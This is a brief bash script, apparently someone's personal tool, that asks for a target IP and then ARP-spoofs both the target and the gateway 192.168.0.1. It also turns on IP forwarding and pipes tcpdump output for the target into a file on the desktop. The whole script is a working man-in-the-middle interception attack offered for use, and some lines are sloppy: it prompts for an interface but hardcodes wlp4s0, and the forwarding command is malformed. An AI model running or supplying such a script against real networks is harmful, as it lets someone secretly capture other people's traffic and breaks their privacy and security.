#!/bin/bash

echo Welcome Shashi,
echo enter interface
read interface
echo enter target ip
read target

sudo arpspoof -i wlp4s0 -t $target 192.168.0.1 & sudo arpspoof -i wlp4s0 -t 192.168.0.1 $target & sudo su | echo 1 > /proc/sys/net/ipv4/ip_forward & sudo tcpdump | grep $target > ~/Desktop/record
 


